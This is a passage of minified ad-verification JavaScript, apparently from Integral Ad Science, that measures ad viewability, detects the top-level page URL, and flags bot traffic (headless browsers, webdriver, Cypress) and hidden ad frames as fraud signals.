          }, I.isDef(e) && e !== A.NA && e > -1 && (r = e >= n.IN_VIEW ? A.IN_VIEW : e <= n.OUT_OF_VIEW ? A.OUT_OF_VIEW : e >= n.PARTIAL_VIEW ? A.PARTIAL_VIEW_PLUS : A.PARTIAL_VIEW_MINUS), r;
        },
        calcPercentInView: function (t, n, r, i) {
          var o = 0,
            a = t;
          return t.hasValidDims() && !t.isHidden() && (I([n, r, i]).each(function (t, n) {
            n.hasValidDims() && (a = e(a, n));
          }), o = We.round(a.area() / t.area() * 100)), o;
        }
      };
    },
    be = function () {
      "use strict";

      var n,
        r,
        i,
        o = !1;
      r = function () {
        var e = "";
        try {
          for (var n, r = t.Uint32Array && t.crypto && t.crypto.getRandomValues; e.length < 32;) r ? (n = new Uint32Array(1), t.crypto.getRandomValues(n), e += n[0].toString(16)) : e += (16 * We.random() | 0).toString(16);
          e = e.slice(0, 32);
        } catch (e) {
          T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.UID_GENERATION);
        }
        return e;
      }(), (i = []).push(r.slice(0, 8)), i.push(r.slice(8, 12)), i.push(r.slice(12, 16)), i.push(r.slice(16, 20)), i.push(r.slice(20)), n = i.join("-");
      var a = function () {
        return e.anId;
      };
      return {
        getAsid: function () {
          return e.asid;
        },
        getAnId: a,
        getCacheBustId: function () {
          var e = new Date(),
            t = Date.parse("Jan 1 " + e.getFullYear()),
            n = e.getTime() - t;
          return I.toBase(n, 62);
        },
        getFwId: function () {
          return a() || e.advEntityId + "-" + e.pubEntityId;
        },
        impressionIsIdentifiable: function (e) {
          return e && (o = !0), o;
        },
        unq: n
      };
    },
    Pe = function (e, t) {
      "use strict";

      return {
        init: function (n) {
          e.jsonp(n, function (e) {
            t.send(A.DT_CODES.THIRD_PARTY, void 0, !1, !0, {
              field: "tpiLookup",
              value: e
            });
          }, !1, "callback");
        }
      };
    },
    Ve = function (e, t, n, r, i) {
      "use strict";

      return {
        getTime: function () {
          return 1e3 * e.getTimeInViewInSeconds();
        },
        getTask: function () {
          return i ? function () {
            var n = T.getAggregator().request("adRenderStatus"),
              i = r || t,
              o = e.getTimeInViewInSeconds();
            n || T.getAggregator().trigger(F.ADD_THROTTLED_PROP, A.DT_SLOT.ENVIRONMENT, "nr_" + i, o);
          } : function () {
            var i = e.getTimeInViewInSeconds(),
              o = e.getTimeInViewForRts();
            I.isDef(r) && (T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
              output: r
            }, W.METRIC_ID, {
              type: t
            }), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
              output: "t"
            }, W.CUSTOM_METRIC_IN_VIEW_REASON, {
              type: t
            })), T.getAggregator().trigger(F.SEND_DT, t, i), n[o] && n[o]();
          };
        }
      };
    },
    Le = function () {
      "use strict";

      return {
        createPingJobs: function (e, t, n, r, i) {
          return I(t.getTimeThresholds()).map(function (t, o) {
            return new Ve(o, e, n, r, i);
          });
        }
      };
    },
    Fe = function () {
      var e,
        t = [],
        n = function (e) {
          var t = "type",
            n = "t",
            r = "timestamp";
          return {
            type: e["tp"] || e[t] || "",
            time: e[n] || e[r] && e[r] - g.measurementConfig.birthdate || ""
          };
        },
        r = function () {
          e || (e = T.getAggregator().request("viewabilityDefinitions")), e && 0 == t.length && I(e).each(function (e, n) {
            n.qivThreshold && t.push(n);
          });
        },
        i = function (e, t) {
          T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: e.metricId
          }, W.METRIC_ID, {
            type: A.DT_CODES.CUSTOM
          }), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: "q"
          }, W.CUSTOM_METRIC_IN_VIEW_REASON, {
            type: A.DT_CODES.CUSTOM
          }), T.getAggregator().trigger(F.SEND_DT, A.DT_CODES.CUSTOM, t), e.rtsCallbacks && I.isFunction(e.rtsCallbacks[A.RTS_KEY_FOR_VQ]) && e.rtsCallbacks[A.RTS_KEY_FOR_VQ]();
        };
      return {
        init: function () {
          r(), T.getAggregator().on(F.VIDEO_QUARTILE_EVENT, function (e) {
            var o, a, s, c, u;
            r(), o = new n(e), s = (a = ["_", "firstQuartile", "midpoint", "thirdQuartile", "complete"]).indexOf(I(a).findFirst(function (e, t) {
              return -1 !== o.type.toLowerCase().indexOf(t.toLowerCase());
            })), c = T.getAggregator().request(x.SCREEN_EVENTS).getCurrentEvent(), u = Math.floor(o.time / 1e3), I(t).each(function (e, t) {
              var n = t.qivThreshold.indexOf(s);
              -1 !== n && t.isInView(c) && t.qivThreshold.length > 0 && (t.qivThreshold.splice(n, 1), 0 == t.qivThreshold.length && i(t, u));
            });
          });
        }
      };
    },
    Ue = function () {
      "use strict";

      var n = function () {
        var t = e.asid;
        return "__IntegralAS_" + (t && t.replace(/\-/g, "") || "") + "_" + We.round(1e4 * Math.random());
      };
      return {
        wrap: function (e, r, i, o) {
          var a,
            s,
            c,
            u = n();
          return function (e, t) {
            return new RegExp(t).test(e);
          }(e = "" + e, o = o || "ias_callback") && (a = function (e, t) {
            return new RegExp("(" + t + "=)(.[^&]*)").exec(e)[0];
          }(e, o), s = a.split("=")[1], c = Xe.stringToFn(s), e = function (e, t) {
            return -1 !== e.indexOf(t + "&") && (t += "&"), e.replace(t, "");
          }(e, a)), t[u] = function (e) {
            r(e), i && c && c(e), t[u] = void 0;
          }, e = function (e, t, n) {
            var r = e.indexOf("?"),
              i = t + "=" + n;
            return -1 === r ? e + "?" + i : (r++, e.slice(0, r) + i + "&" + e.slice(r));
          }(e, o, u), e;
        },
        wrapToGlobal: function (e) {
          var r = n();
          return t[r] = function (n) {
            e(n), t[r] = void 0;
          }, r;
        }
      };
    },
    xe = function (t, n, r) {
      "use strict";

      var i = function (t, n) {
          var r,
            i = t;
          return n && (r = "," + I(n).stringify(function (e, t) {
            return e + ":" + t;
          }, ","), (i = se(t, !0)).appendToParamValue("adsafe_jsinfo", I.encodeInvalidUrlChars(r, e.encodeInvalidUrlChars)), i = i.toString()), i;
        },
        o = {
          jss: {
            isFW: !0,
            nodeType: Ae.doesPageAllowAppendedScripts() ? "script" : "img"
          },
          rjss: {
            isFW: !0,
            onloadCallback: Yr,
            impressionMethod: function (e) {
              if (Ae.isAMZN() && Ae.isBlocking() && g.measurementConfig.staticMode) T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
                output: !0
              }, "ablk"), T.getAggregator().trigger("jsonp", e + "&format=jsonp", e => {
                let {
                  nodeType: t,
                  creativeUrl: n
                } = e;
                t = "unknown" === t ? "script" : t, T.getAggregator().trigger("addNode", t, n);
              }, !1, "cbName");else {
                const t = Ae.doesPageAllowAppendedScripts() ? "script" : "img";
                T.getAggregator().trigger("addNode", t, e, Yr);
              }
            }
          },
          jsi: {
            isFW: !0,
            nodeType: "iframe"
          },
          rjsi: {
            isFW: !0,
            nodeType: "iframe"
          },
          jload: {
            impressionMethod: function (e) {
              t.enabled ? T.getAggregator().trigger("jsonp", e, t.callback, !0) : T.getAggregator().trigger("send", e, function () {
                Yr(), T.getAggregator().trigger("sendDiag");
              }, !n.on("postMon"));
            }
          },
          bapi: {
            impressionMethod: function (e) {
              var n = t.enabled ? t.callback : I.noop,
                r = !!t.enabled;
              T.getAggregator().trigger("jsonp", e, n, r);
            }
          },
          jsapi: {
            isFW: !0,
            impressionMethod: function (e) {
              var n = t.enabled ? t.callback : I.noop,
                r = !!t.enabled;
              T.getAggregator().trigger("jsonp", e, n, r);
            }
          },
          jsvid: {
            manualDefer: !0,
            impressionMethod: function (r) {
              T.getAggregator().on("adImpression", function (o, a) {
                var s;
                try {
                  s = i(r, a), t.enabled ? T.getAggregator().trigger("jsonp", s, t.callback, !0) : T.getAggregator().trigger("send", s, I.noop, !n.on("postMon"));
                } catch (t) {
                  __IntegralASDiagnosticCall("jsvidimp", t, e);
                }
              });
            }
          },
          fwjsvid: {
            isFW: !0,
            manualDefer: !0,
            impressionMethod: function (t) {
              var n = "false" === e.fwMonitoring;
              n && T.getAggregator().trigger("jsonp", function (e) {
                var t;
                return (t = e.split("/"))[3] = "db2", t[4] = "video", t.join("/");
              }(t), function (e) {
                T.getAggregator().trigger("videoBlockResult", e);
              }), T.getAggregator().on("adImpression", function (r, o) {
                var a, s;
                try {
                  n && (s = r) && I.isBool(s.integral_didBlock) && s.integral_timeToDecision >= 0 && (t = function (e) {
                    var n = "$1$2,abc:" + (e.integral_didBlock ? 1 : 0) + ",abct:" + e.integral_timeToDecision;
                    return t.replace(/(adsafe_jsinfo=)([^&]*)/, n);
                  }(r)), a = i(t, o), T.getAggregator().trigger("send", a, I.noop, !0);
                } catch (t) {
                  __IntegralASDiagnosticCall("fwjsvidimp", t, e);
                }
              });
            }
          },
          jspix: {
            nodeType: "img"
          }
        };
      return new function () {
        var t = o[e.mode],
          n = !!t.isFW,
          i = function (t) {
            var n;
            return n = T.getAggregator().request("mobileApp").isMobileAppEnvironment() && e.mobFwUrl ? e.mobFwUrl : t ? e.adsafeSrc : e.requrl, t || (n += "?" + e.reqquery), n;
          }(n),
          a = i.indexOf("BEGIN__ADSAFE"),
          s = -1 !== a,
          c = s ? i.slice(a) : "";
        return {
          isFW: n,
          baseUrl: s ? i.slice(0, a) : function (e) {
            var t = -1 === e.indexOf("?") ? "?" : "&";
            return e + t;
          }(i),
          macroUrl: c,
          sendImpression: function (e) {
            var n = function () {
              T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
                output: Ae.getTagTime()
              }, W.STATIC_IMPRESSION_RFW_CALL_REQUEST_TIME), t.nodeType ? T.getAggregator().trigger("addNode", t.nodeType, e, t.onloadCallback) : t.impressionMethod(e);
            };
            r || t.manualDefer ? n() : t.manualDefer || T.getAggregator().on("adImpression", function () {
              n();
            });
          }
        };
      }();
    },
    We = {
      execAtEndOfThread: function (e) {
        "use strict";

        We.setTimeout(e, 0);
      },
      now: function () {
        "use strict";

        return new Date().getTime();
      },
      random: function () {
        "use strict";

        return Math.random();
      },
      round: function (e) {
        "use strict";

        return Math.round(e);
      },
      ceil: function (e) {
        "use strict";

        return Math.ceil(e);
      },
      floor: function (e) {
        "use strict";

        return Math.floor(e);
      },
      min: function () {
        "use strict";

        return Math.min.apply(null, arguments);
      },
      max: function () {
        "use strict";

        return Math.max.apply(null, arguments);
      },
      getWindow: function () {
        "use strict";

        return t;
      },
      getTimeoutScope: function () {
        "use strict";

        return Ae.isDomless() && Ae.isOmid() ? T.getAggregator().request(x.OMID_VERIFICATION_CLIENT) : t;
      },
      setInterval: function (e, t) {
        "use strict";

        return We.getTimeoutScope().setInterval(e, t);
      },
      setTimeout: function (e, t) {
        "use strict";

        return We.getTimeoutScope().setTimeout(e, t);
      },
      clearInterval: function (e) {
        "use strict";

        We.getTimeoutScope().clearInterval(e);
      },
      clearTimeout: function (e) {
        "use strict";

        We.getTimeoutScope().clearTimeout(e);
      },
      getMaxNumber: function () {
        "use strict";

        return Number.MAX_VALUE;
      },
      getTop: function () {
        "use strict";

        return Ae.isDomless(), top;
      },
      getDoc: function () {
        "use strict";

        return Ae.isDomless(), n;
      },
      getIntersectionObserver: function (e, t) {
        "use strict";

        return Ae.isDomless(), new IntersectionObserver(e, t);
      },
      getMutationObserver: function (e) {
        "use strict";

        return Ae.isDomless(), new MutationObserver(e);
      },
      getResizeObserver: function (e) {
        "use strict";

        return Ae.isDomless(), new ResizeObserver(e);
      },
      pow: function (e, t) {
        "use strict";

        return Math.pow(e, t);
      }
    },
    Be = function () {
      "use strict";

      return {
        createInstance: function () {
          return Ae.isDomless() ? new ke() : new Ge();
        }
      };
    },
    Ge = function () {
      "use strict";

      var e,
        t,
        n,
        r,
        i = !1,
        o = !1,
        a = (T.getAggregator().request(x.FEATURES), new X()),
        s = function () {
          return I.isDef(e.prop) ? We.getDoc()[e.prop] : null;
        };
      return t = "hidden", n = "visibilitychange", r = We.getDoc(), I.isUndef(r.hidden) ? I(["moz", "ms", "webkit"]).each(function (e, o) {
        var a = o + "Hidden";
        I.isDef(r[a]) && (t = a, n = o + n, i = !0);
      }) : i = !0, e = i ? {
        prop: t,
        event: n
      } : {}, {
        isHidden: s,
        onHiddenChange: function (t) {
          var n, r;
          a.push(t), o || (o = !0, n = We.getWindow(), r = function () {
            a.run(s());
          }, _e.addEvent(n, "focus", r, !0), _e.addEvent(n, "blur", r, !0), e.event && _e.addEvent(We.getDoc(), e.event, r, !0));
        },
        supportsVisAPI: function () {
          return i;
        }
      };
    },
    ke = function () {
      "use strict";

      return {
        isHidden: function () {
          return !1;
        },
        onHiddenChange: function (e) {},
        supportsVisAPI: function () {
          return !0;
        }
      };
    },
    He = function () {
      "use strict";

      return {
        createInstance: function (e, t) {
          return Ae.isDomless() ? new je() : new Ye(e, t);
        }
      };
    },
    Ye = function (n, r) {
      "use strict";

      var i,
        o = function (e) {
          var t = [["ab", "about%3A"], ["da", "data%3A"], ["js", "javascript%3A"], ["fi", "file%3A"], ["uu", "uuid-in-package"], ["cx", "chrome-extension%3A"], ["lo", "http%3A%2F%2Flocalhost"], ["lo", "https%3A%2F%2Flocalhost"]];
          if ("string" == typeof e && "null" !== e && "" !== e && "undefined" !== e) {
            for (var n = 0; n < t.length; n++) if (e.startsWith(t[n][1])) return "";
            if (-1 === e.indexOf(".")) return T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
              output: e.substring(0, 40)
            }, W.BAD_URL_NO_PERIOD, {
              type: A.IMPRESSION_EVENT
            }), "";
          }
          return e;
        },
        a = function () {
          var a = {};
          try {
            a.a = encodeURIComponent(top.location.href);
          } catch (e) {}
          try {
            a.b = encodeURIComponent(parent.location.href);
          } catch (e) {}
          if (Ae.embedded) {
            try {
              a.c = encodeURIComponent(parent.document.referrer);
            } catch (e) {}
            try {
              a.e = encodeURIComponent(t.document.referrer);
            } catch (e) {}
          }
          try {
            "jsi" !== e.mode && (a.d = encodeURIComponent(t.location.href));
          } catch (e) {}
          try {
            a.f = encodeURIComponent(e.jsref);
          } catch (e) {}
          try {
            var s = r.getWindow();
            a.q = encodeURIComponent(s.parent.parent.parent.parent.parent.parent.parent.parent.parent.parent.location.href || "");
          } catch (e) {}
          try {
            n.isStarted() && n.getMyFrameDepth() > 1 && (a.g = encodeURIComponent(n.getTopDomain())), n.isStarted() && Ae.xDomainIframe && 1 === n.getMyFrameDepth() && (a.y = encodeURIComponent(n.getTopDomain()));
          } catch (e) {}
          var c = "not-set";
          try {
            if (Ae.isSafeFrame()) {
              var u = r.getWindow(),
                d = u && u.$sf && u.$sf.ext && u.$sf.ext.hostURL,
                g = "function" == typeof d && d();
              if ("string" == typeof g) {
                c = encodeURIComponent(g);
                var f = !1;
                "function" == typeof URL ? (new URL(g), f = !0) : g.startsWith("http") && (f = !0), f ? (a.x = c, T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
                  output: c
                }, W.SAFEFRAME_HOSTURL, {
                  type: A.IMPRESSION_EVENT
                })) : T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
                  output: c
                }, W.SAFEFRAME_INVALID_HOSTURL, {
                  type: A.IMPRESSION_EVENT
                });
              }
            }
          } catch (e) {
            T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
              output: c
            }, W.SAFEFRAME_INVALID_HOSTURL, {
              type: A.IMPRESSION_EVENT
            });
          }
          a = function (e) {
            for (var t in e) if (e.hasOwnProperty(t)) {
              var n = o(e[t]);
              ("" === n || "null" === n || "undefined" === n || null === n || I.isUndef(n)) && delete e[t];
            }
            return e;
          }(a), a = function (e) {
            var t,
              n,
              r = {};
            for (n in e) e.hasOwnProperty(n) && (t = e[n], I.isUndef(r[t]) ? r[t] = n : r[t] += n);
            var i = {};
            for (n in r) r.hasOwnProperty(n) && (i[t = r[n]] = n);
            return i;
          }(a);
          var l = [];
          for (var E in a) a.hasOwnProperty(E) && l.push({
            key: E,
            val: a[E]
          });
          return l.sort(function (e, t) {
            return e.val.length > t.val.length ? 1 : e.val.length < t.val.length ? -1 : 0;
          }), i = l, l;
        };
      return {
        detectTopURL: a,
        getDetectedURLs: function () {
          return i || a();
        }
      };
    },
    je = function () {
      "use strict";

      return {
        detectTopURL: function () {
          return [];
        },
        getDetectedURLs: function () {
          return [];
        }
      };
    },
    qe = function (t) {
      "use strict";

      var n = !1;
      return {
        measure: function (r) {
          (n = 0 === r.rsa) && t.trigger("notify", e._onSuspicious);
        },
        skipAsFraudulent: function () {
          return n;
        }
      };
    },
    Ke = function () {
      "use strict";

      var e,
        t,
        n,
        r = [],
        i = {},
        o = {
          sl: "n"
        },
        a = 0,
        s = {
          i: 0,
          o: 0,
          n: 0,
          pp: 0,
          pm: 0
        },
        c = function (e) {
          var t = T.getAggregator().request(x.FEATURES);
          if (t && t.on("recoverOmidLostTime")) {
            var n = s.ri;
            s.ri = n ? n + e : e;
          }
        },
        u = function (e, t) {
          var n = new re(t);
          return i[e] = n, n;
        },
        d = function (e, t) {
          return (t = t || "") + {
            inView: "i",
            outOfView: "o",
            na: "n",
            partialViewMinus: "pm",
            partialViewPlus: "pp"
          }[e];
        },
        g = function () {
          I(o).each(function (e, t) {
            var i = r.length ? n - a : n;
            s[t] += i;
          }), a = n;
        },
        f = function (e) {
          r.length && g(), I(e).each(function (e, t) {
            var n, r;
            n = t, (r = o[e]) !== n && "n" === r && (s[n] += s.n), o[e] = t;
          }), r.length || g();
        },
        l = function (e) {
          A.NA;
          var r,
            o = e.adDimensions ? e.adDimensions.getRounded() : {
              width: 0,
              height: 0
            },
            a = function (e) {
              var t,
                n = {},
                r = e.winDimensions,
                i = e.adDimensions;
              return I.isDef(r) && r.hasValidDims() && (n.wc = r), I.isDef(i) && i.hasValidDims() && (n.ac = i, n.am = e.method, n.cc = e.containerDimensions), I({
                piv: "percentInView",
                obst: "obstructed",
                th: "tabHidden",
                reas: "reason"
              }).each(function (t, r) {
                var i = e[r];
                I.isDef(i) && (n[t] = i);
              }), "" === (t = I(n).toParams()) ? "" : "," + t;
            }(e),
            s = e.omidObstructions,
            c = {
              sl: d(e.viewState)
            };
          return n = Ae.getTagTime(), f(c), c.t = n, r = I({
            toString: function () {
              return I(i).each(function (e, t) {
                t.fastForward();
              }), "{" + I(c).toParams() + this.details + this.breakdowns + "}";
            },
            details: a,
            breakdowns: {
              piv: [],
              as: [],
              toString: function () {
                var e = "",
                  t = function (e, t) {
                    return t.duration + "~" + t.state;
                  };
                return e += "piv:[" + I(this.piv).stringify(t) + "]", ",bkn:{" + (e += ",as:[" + I(this.as).stringify(t) + "]") + "}";
              }
            }
          }).mixin(c), I(r).mixin(e), r.width = o.width, r.height = o.height, I.isUndef(r.percentInView) && (r.percentInView = A.PIV_NA), I.isUndef(r.reason) && (r.reason = ""), I.isDef(s) && "" !== s && (r.omidObstructions = s), t = r, r;
        };
      return function () {
        u("piv", function (e) {
          var t,
            n = e.percentInView,
            r = [1, 25, 30, 50, 75];
          return 100 === n || 0 === n ? t = n : (I(r).each(function (e, i) {
            I.isUndef(t) && n < i && (t = r[e - 1]);
          }), I.isUndef(t) && (t = r[r.length - 1])), t;
        }), u("as", function (e) {
          var t = A.NA,
            n = e.adDimensions ? e.adDimensions.getRounded() : {
              width: t,
              height: t
            };
          return n.width + "." + n.height;
        });
        var e = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT);
        e && e.recoveredTime > -1 && c(e.recoveredTime);
      }(), {
        fastForward: function () {
          n = Ae.getTagTime(), g();
        },
        registerLocation: function (t) {
          var n,
            a = !1;
          return o.sl == d(t.viewState) && r.length ? (n = new l(t), r[r.length - 1].details = n.details) : (n = new l(t), r.push(n), e = t.viewState, a = !0), T.getAggregator().trigger(F.NEW_SCREEN_EVENT, n), I(i).each(function (e, t) {
            -1 !== "piv|as".indexOf(e) ? (a && t.clear(), t.addState(n), r[r.length - 1].breakdowns[e] = t.get()) : t.addState(n);
          }), n;
        },
        stringify: function (e) {
          var t = "";
          return r.length && (t = I({
            slTimes: "{" + I(s).toParams() + "}",
            slEvents: "[" + r.slice(-e).join(",") + "]",
            slEventCount: r.length
          }).toParams()), t;
        },
        createViewabilityTracker: u,
        getCurrentLoc: function () {
          return d(e);
        },
        getCurrentEvent: function () {
          return t;
        },
        setRecoveredTimeInSlTimes: c
      };
    },
    Xe = {
      hashCode: function (e) {
        "use strict";

        var t,
          n,
          r = 0;
        if (0 === e.length) return r;
        for (t = 0, n = e.length; t < n; t++) r = (r << 5) - r + e.charCodeAt(t), r |= 0;
        return r;
      },
      rot: function (e) {
        "use strict";

        return e.replace(/[a-zA-Z]/g, function (e) {
          return String.fromCharCode((e <= "Z" ? 90 : 122) >= (e = e.charCodeAt(0) + 13) ? e : e - 26);
        });
      },
      stringToFn: function (e) {
        "use strict";

        var n,
          r,
          i = t,
          o = e.split(".");
        for (n = 0; n < o.length; n++) if (r = i, i = i[o[n]], I.isUndef(i) || n === o.length - 1 && !I.isFunction(i)) return !1;
        return function () {
          i.apply(r, arguments);
        };
      },
      stringToProp: function (e) {
        "use strict";

        var t,
          n = We.getWindow(),
          r = e.split(".");
        for (t = 0; t < r.length && (n, n = n[r[t]], !I.isUndef(n)); t++);
        return n;
      },
      contains: function (e, t) {
        "use strict";

        return !!I.isStr(e) && -1 !== e.indexOf(t);
      },
      trim: function (e) {
        "use strict";

        return I.isFunction(e.trim) ? e.trim() : e.replace(" ", "");
      }
    };
  const ze = function () {
      "use strict";

      const e = function () {
          const e = function (e) {
              return e && e.width && e.width > 30 && e.height && e.height > 30;
            },
            t = function (t) {
              const n = Oe.getDimensionFromAttributes(t);
              return e(n);
            };
          return {
            hasValidDimensions: function (n) {
              return t(n) || function (t) {
                const n = Oe.getDimensionFromStyle(t);
                return e(n);
              }(n);
            },
            hasValidDimentionAttributes: t
          };
        }(),
        t = /GoogleActiveViewElement/,
        n = /DfaVisibilityIdentifier_/,
        r = /doubleclick.net\/pcs\/click?/,
        i = /_blank/,
        o = function (e) {
          const t = e && Oe.tagNameIs(e, "a"),
            n = Oe.attributeMatches(e, "href", r),
            o = Oe.attributeMatches(e, "target", i);
          return t && n && o;
        },
        a = function (e) {
          const r = Oe.tagNameIs(e, "div"),
            i = Oe.attributeMatches(e, "class", t),
            o = Oe.attributeMatches(e, "id", n);
          return r && i && o;
        };
      return {
        getDFPGoogleDiv: function (e) {
          return Oe.traverseAndFindFirstMatchingNode(e, a);
        },
        getClickableImage: function (t) {
          let n, r;
          const i = Oe.traverseAndFindFirstMatchingNode(t, o);
          return i && (r = Oe.getFirstChildElement(i), Oe.isImageTag(r) && e.hasValidDimentionAttributes(r) && (n = r)), n;
        },
        getNodeMatchingMinimumSize: function (t) {
          return Oe.traverseAndFindFirstMatchingNode(t, e.hasValidDimensions);
        }
      };
    },
    Je = function () {
      "use strict";

      const e = ze(),
        t = function (e, t) {
          t.tag = Oe.getTagName(e), t.size = Oe.getDimensionFromAttributes(e) || Oe.getDimensionFromStyle(e);
        };
      return {
        getDFPValue: function (n) {
          let r;
          const i = e.getDFPGoogleDiv(n);
          return r = i ? function (n) {
            let r, i;
            const o = {
              type: 0
            };
            return n && (o.type = 1, r = e.getClickableImage(n), r ? (o.type = 2, t(r, o)) : (i = e.getNodeMatchingMinimumSize(n), i && (o.type = 3, t(i, o)))), o;
          }(i) : function (n) {
            const r = {
                type: 0
              },
              i = e.getNodeMatchingMinimumSize(n);
            return i && (r.type = 4, t(i, r)), r;
          }(n), r;
        }
      };
    },
    Qe = {
      name: "hB",
      dependencies: [],
      creator: function () {
        "use strict";

        try {
          const e = We.getWindow(),
            t = We.getTop(),
            n = !(!t || !t.document) && Object.getOwnPropertyNames(t),
            r = () => {
              var t, n;
              const r = null == e ? void 0 : e.navigator,
                i = null === (t = null == r ? void 0 : r.userAgentData) || void 0 === t ? void 0 : t.brands;
              return (null === (n = null == i ? void 0 : i.map(e => null == e ? void 0 : e.brand)) || void 0 === n ? void 0 : n.includes("HeadlessChrome")) || !1;
            },
            i = {
              cdcP: I.stringifyTriState(n && -1 !== n.indexOf("cdc_adoQpoasnfa76pfcZLmcfl_Promise")),
              cdcA: I.stringifyTriState(n && -1 !== n.indexOf("cdc_adoQpoasnfa76pfcZLmcfl_Array")),
              cdcS: I.stringifyTriState(n && -1 !== n.indexOf("cdc_adoQpoasnfa76pfcZLmcfl_Symbol")),
              cyp: I.stringifyTriState(n && -1 !== n.indexOf("Cypress")),
              wd: I.stringifyTriState(I.isDef(e.navigator.webdriver) && !0 === e.navigator.webdriver),
              uaHC: I.stringifyTriState(e.navigator.userAgent.length > 0 && -1 !== e.navigator.userAgent.indexOf("HeadlessChrome")),
              chHC: I.stringifyTriState(r())
            },
            o = 1,
            a = e => I(e).contains(o),
            s = function (e) {
              T.getAggregator().trigger("addThrottledProp", "sca", "hbs", I(e).toION());
            };
          a(i) && s(i);
        } catch (e) {}
      },
      settings: {
        tier: 4,
        applies: function () {
          "use strict";

          return !0;
        }
      }
    },
    $e = {
      name: "viewport",
      dependencies: [],
      creator: function () {
        "use strict";

        const e = {
            width: 4,
            height: 4
          },
          t = function (t) {
            return !Oe.isViewportVisible(t, e);
          },
          n = function (e, r) {
            return e !== r && t(e) ? e : e !== r && Ae.isFriendlyToParent(e) ? n(e.parent, r) : void 0;
          },
          r = function () {
            const e = We.getWindow();
            return n(e, We.getWindow().top);
          },
          i = function () {
            return void 0 !== r();
          };
        return {
          MIN_VISIBLE_DIM: e,
          isHidden: i,
          isCurrentIframeTheHiddenFrame: function () {
            let e;
            const n = We.getWindow();
            return t(n) ? e = !0 : i() && (e = !1), e;
          },
          getWindowWithHiddenViewport: r
        };
      }
    },
    Ze = function (e) {
      "use strict";

      let t, n;
      const r = function (r) {
          t = e.setInterval(r, 100), n = e.setTimeout(function () {
            i();
          }, 42e4);
        },
        i = function () {
          t && (e.clearInterval(t), t = null), n && (e.clearTimeout(n), n = null);
        };
      return {
        onResize: function (t) {
          let n = e.innerWidth,
            o = e.innerHeight,
            a = !1;
          r(function () {
            const r = function () {
              const t = e.innerWidth,
                r = e.innerHeight;
              return t !== n || r !== o;
            }();
            r && (a = !0), a && !r && (t(), i(), a = !1), n = e.innerWidth, o = e.innerHeight;
          });
        }
      };
    },
    et = {
      name: "AS_Finder",
      dependencies: ["viewport"],
      creator: function (e, t) {
        "use strict";

        let n;
        const r = function () {
          try {
            !function (r) {
              let i;
              const o = {};
              r !== n && (i = I.stringifyTriState(r), o.res1 = i, o.ps = i, o.ts = We.now(), o.psfr = I.stringifyTriState(e.isCurrentIframeTheHiddenFrame()), t.events.trigger("newState", o)), n = r;
            }(e.isHidden());
          } catch (e) {
            T.getAggregator().trigger("error", A.ERROR_CODES.HIDDEN2);
          }
        };
        return {
          start: function () {
            e.isHidden() && (r(), function () {
              const t = e.getWindowWithHiddenViewport();
              t && Ze(t).onResize(r);
            }());
          }
        };
      },
      settings: {
        emits: !0,
        applies: function (e, t, n) {
          "use strict";

          return n.embedded && !n.isBustedIframe() && !n.isSpecifiedAd();
        }
      }
    },
    tt = {
      name: "hA",
      dependencies: ["AS_Finder"],
      creator: function (t) {
        "use strict";

        let n = 0;
        const r = function (e, t) {
            T.getAggregator().trigger(F.ADD_THROTTLED_PROP, A.DT_SLOT.FF, e, I(t).toION());
          },
          i = function (e) {
            n < 2 && r("ha1", e), n++;
          };
        !function () {
          let n, o;
          if (Ae.embedded) try {
            o = e.contextNode.parentNode, n = Je().getDFPValue(o), r("dfp", function (e) {
              const t = {};
              return t.df = e.type, e.size && (t.sz = e.size.width + "." + e.size.height), e.tag && (t.dom = e.tag), t;
            }(n)), n.size && t && (t.events.on("newState", i), t.start());
          } catch (e) {
            T.getAggregator().trigger(F.ERROR, A.ERROR_CODES.HIDDEN);
          }
        }();
      },
      settings: {
        tier: A.TIERS.PRE_IMPRESSION_FRAUD,
        applies: function (e) {
          "use strict";

          return e.on("usehaps");
        }
      }
    },
    nt = {
      name: "thresholdDetector",
      dependencies: [],
      creator: function () {
        "use strict";

        return {
          create: (e, t, n) => {
            let r;
            let i = t();
            const o = () => {
              const o = t();
              o !== i && !0 && (n(e, o), We.clearInterval(r)), i = o;
            };
            i && (n(e, i), r = We.setInterval(o, 50));
          }
        };
      }
    },
    rt = {
      name: "invisibleAds",
      dependencies: ["thresholdDetector"],
      creator: function (t) {
        "use strict";

        const n = {
            width: 4,
            height: 4
          },
          r = () => {
            const e = _e.getStyle(We.getWindow().frameElement, "opacity");
            return parseFloat(e) < .2;
          },
          i = () => "hidden" === _e.getStyle(We.getWindow().frameElement, "visibility"),
          o = (e, t) => {
            const n = {
              res1: I.stringifyTriState(t)
            };
            T.getAggregator().trigger(F.ADD_THROTTLED_PROP, "sca", e, I(n).toION());
          };
        try {
          const a = e.contextNode.parentNode,
            s = Je().getDFPValue(a);
          Oe.isViewportVisible(We.getWindow(), n) && 2 === s.type && (r() && t.create("ha2", r, o), i() && t.create("ha3", i, o));
        } catch (e) {}
      },
      settings: {
        tier: 4,
        applies: function (e, t, n) {
          "use strict";

          return n.embedded && !n.isBustedIframe() && !n.isSpecifiedAd();
        }
      }
    };
  var it = function (e, n, r, i) {
      "use strict";

      var o,
        a,
        s = 0,
        c = 0,
        u = e && e.body,
        d = !1,
        g = function () {
          if ((o = Math.round(Oe.getNodeArea(e.body))) >= i) {
            for (var t, n, a = o + 20 * o / 100, u = e.querySelectorAll("iframe"), d = I.fromNodeListToArray(u); d.length && (c < a || s < r);) t = d.shift(), (n = Math.round(Oe.getNodeArea(t))) >= i && (s++, c += n);
            c >= a && s >= r && f();
          }
        },
        f = function () {
          var e = {
            va: o,
            bia: c,
            bin: s
          };
          T.getAggregator().trigger(F.ADD_THROTTLED_PROP, A.DT_SLOT.FF, n, I(e).toION()), d = !0;
        };
